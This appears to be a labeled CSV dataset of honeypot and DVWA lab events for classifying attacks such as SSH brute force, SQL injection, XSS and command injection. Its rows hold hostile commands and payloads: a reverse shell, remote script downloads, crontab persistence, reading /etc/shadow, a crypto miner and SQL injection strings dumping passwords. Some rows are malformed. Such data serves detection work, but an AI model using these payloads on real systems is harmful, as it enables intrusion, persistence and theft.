text,label
source:cowrie event:cowrie.command.input ip:103.66.58.215 username:- password:- command:tar czf /tmp/data.tar.gz /etc /home /var/www request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:172.25.111.169 username:- password:- command:mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.118.45.29 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /etc request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.94.199.211 username:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:203.24.41.16 username:nobody password:superman command:- request:-,BRUTE_FORCE_SSH-COWRIE
"event:SQLi source:DVWA ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+extractvalue%281%2cconcat%280x7e%2cversion%28%29%29%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie ip:103.58.154.112 event:cowrie.login.failed username:pi password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:echo '* * * * * /tmp/back.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.27.113.219 username:- password:- command:wget http://evil.ru/r00t.sh -O /tmp/r00t.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- command:id password:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.97.10 username:- password:- command:ls -la / request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cd /tmp request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:185.194.50.45 username:- password:- command:- request:""GET /dvwa/?dvwaSecurityLevel=low HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:172.25.59.184 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls -la request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:192.168.25.175 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1""",XSS-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.109.94.1 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:172.29.173.213 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:185.168.106.145 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:203.198.89.3 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/hosts,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.131.132.36 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:172.24.99.166 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:172.21.171.21 username:ansible password:letmein command:- request:-,BRUTE_FORCE_SSH-COWRIE
"event:SQLi ip:10.244.77.194 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+HAVING+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:uname -a request:-,SSH_COMMAND-COWRIE
"source:DVWA ip:185.232.221.13 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:45.174.137.110 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1""",XSS-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:server command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:103.215.186.205 username:proxy password:password1 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:45.88.248.184 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:whoami request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:91.164.23.132 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+sleep(3)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:185.218.106.254 username:- password:- command:./xmrig --donate-level 1 -o xmr.pool.minergate.com:45700 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- ~/.ssh command:ls request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:10.1.234.16 username:rabbitmq password:12345 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:192.168.213.246 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.127.128.12 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.129.108.33 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.login.failed username:jenkins password:654321 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:91.12.111.158 username:postgres password:login command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi username:- ip:10.194.151.59 password:- command:- request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.169.20.126 username:- password:- command:ip route request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:10.181.135.223 password:- username:- command:ls -la /opt request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:10.25.249.51 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input username:- ip:10.183.167.203 password:- command:echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 password:- /proc/cpuinfo command:cat request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:echo '* * * * * /tmp/back.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:192.168.106.238 username:- password:- command:- request:""GET HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:172.25.198.211 username:man password:password1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:103.100.169.154 username:ansible password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:45.171.117.65 username:- request:""POST command:- /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
event:cowrie.login.success source:cowrie ip:192.168.244.137 username:root password:rockyou command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:10.49.244.108 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:203.184.42.191 password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2flog%2fauth.log HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:185.161.203.151 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:185.209.178.152 username:mysql password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:172.24.11.191 username:ftpuser password:guest command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.39.102.89 username:- password:- command:ip route request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:103.222.15.73 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:203.151.115.11 username:ftpuser password:qwerty command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:185.140.4.97 username:- password:- command:clear request:-,SSH_COMMAND-COWRIE
source:cowrie ip:192.168.244.137 event:cowrie.command.input username:- password:- command:cat /etc/shadow request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.254.53.34 username:- password:- command:ifconfig request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.118.76.227 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"event:LOGIN source:DVWA ip:203.55.212.1 password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.211.160 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:hostname request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.5.132.1 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success username:man ip:203.189.15.82 password:login request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.64.82.230 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:who request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.220.165.209 username:- password:- command:crontab -e request:-,SSH_COMMAND-COWRIE
event:cowrie.login.success ip:45.153.148.206 username:svn password:welcome command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:172.18.171.244 username:- command:crontab -e request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:172.28.240.82 username:rabbitmq password:passw0rd command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:172.17.223.225 username:- password:- command:- request:""GET /dvwa/robots.txt HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:172.26.108.199 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:203.125.241.188 username:zabbix password:000000 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:203.143.170.184 password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:103.185.111.223 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:203.38.33.251 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie ip:192.168.38.151 username:deploy password:root command:- request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:91.79.87.26 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fssh%2fsshd_config HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:id request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.118.111.98 username:- password:- command:find / -perm -4000 2>/dev/null request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.142.128.124 username:- password:- command:tar czf /tmp/data.tar.gz /etc /home /var/www request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:172.23.242.24 username:postgres password:000000 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:203.37.248.65 username:mail password:123123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:172.31.30.134 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:172.20.82.112 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:45.104.170.88 username:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fssh%2fsshd_config HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:172.24.128.108 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:netstat -a request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.92.199.145 username:- password:- command:apt-get install -y netcat request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.66.86.123 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:172.21.121.114 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:10.178.182.8 username:- password:- command:yum -y nmap request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:172.22.181.122 username:- password:- command:yum install -y nc request:-,SSH_COMMAND-COWRIE
"source:DVWA ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=admin+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.179.170 username:- password:- command:- HTTP/1.1"" /dvwa/vulnerabilities/sqli/?id='+WAITFOR+DELAY+'0:0:5'--&Submit=Submit",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:103.64.47.150 username:jenkins password:shadow command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:203.78.222.182 username:- password:- command:yum install -y nc request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.80.196 username:- password:- command:echo '* * * * * root /tmp/bot.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:172.27.179.88 username:gnats password:secret command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:45.119.2.182 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA ip:103.100.58.18 event:SQLi username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.142.167.50 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:203.224.7.74 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:185.131.228.225 username:- password:- command:cat /etc/hosts request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.51.99.138 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:45.207.121.47 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
